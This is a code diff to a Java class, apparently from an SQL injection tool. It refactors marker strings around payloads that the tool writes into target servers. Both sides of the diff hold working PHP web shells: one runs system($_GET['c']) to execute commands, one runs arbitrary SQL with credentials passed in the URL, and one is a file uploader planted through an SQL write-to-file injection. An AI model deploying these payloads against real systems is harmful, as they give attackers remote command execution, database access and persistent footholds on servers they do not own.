@@ -200,7 +200,7 @@ public class RessourceAccess {
             return;
         }
         
-        String payloadWeb = "<SQLi><?php system($_GET['c']); ?><iLQS>";
+        String payloadWeb = "<"+ DataAccess.LEAD +"><?php system($_GET['c']); ?><"+ DataAccess.TRAIL +">";
 
         String pathShellFixed = pathShell;
         if (!pathShellFixed.matches(".*/$")) {
@@ -267,7 +267,7 @@ public class RessourceAccess {
             }
         }
 
-        Matcher regexSearch = Pattern.compile("(?s)<SQLi>(.*)<iLQS>").matcher(pageSource);
+        Matcher regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*)<"+ DataAccess.TRAIL +">").matcher(pageSource);
         regexSearch.find();
 
         String result;
@@ -341,14 +341,14 @@ public class RessourceAccess {
         }
         
         String payloadSQL = 
-            "<SQLi><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);"
-                + "$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<iLQS>');"
+            "<"+ DataAccess.LEAD +"><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);"
+                + "$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<"+ DataAccess.TRAIL +">');"
                 + "if(is_resource($result)){"
                     + "echo'<SQLr>';"
                     + "while($row=mysql_fetch_array($result,MYSQL_NUM))echo'<tr><td>',join('</td><td>',$row),'</td></tr>';"
                 + "}else if($result==TRUE)echo'<SQLm>Query OK: ',mysql_affected_rows(),' row(s) affected';"
                 + "else if($result==FALSE)echo'<SQLm>Query failed';"
-            + " ?><iLQS>";
+            + " ?><"+ DataAccess.TRAIL +">";
 
         String pathShellFixed = pathShell;
         if (!pathShellFixed.matches(".*/$")) {
@@ -502,7 +502,7 @@ public class RessourceAccess {
             return;
         }
         
-        String sourceShellToInject = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
+        String sourceShellToInject = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'"+ DataAccess.LEAD +"y':'n'; ?>";
 
         String pathShellFixed = pathFile;
         if (!pathShellFixed.matches(".*/$")) {
@@ -510,7 +510,7 @@ public class RessourceAccess {
         }
         
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().vendor.instance().sqlTextIntoFile("<SQLi>"+ sourceShellToInject +"<iLQS>", pathShellFixed + FILENAME_UPLOAD)
+            MediatorModel.model().vendor.instance().sqlTextIntoFile("<"+ DataAccess.LEAD +">"+ sourceShellToInject +"<"+ DataAccess.TRAIL +">", pathShellFixed + FILENAME_UPLOAD)
         );
 
         String[] sourcePage = {""};
@@ -600,7 +600,7 @@ public class RessourceAccess {
                         }
                     } while (len > 0);
     
-                    if (result.indexOf("SQLiy") > -1) {
+                    if (result.indexOf(DataAccess.LEAD +"y") > -1) {
                         LOGGER.debug("Upload successful");
                     } else {
                         LOGGER.warn("Upload failed");
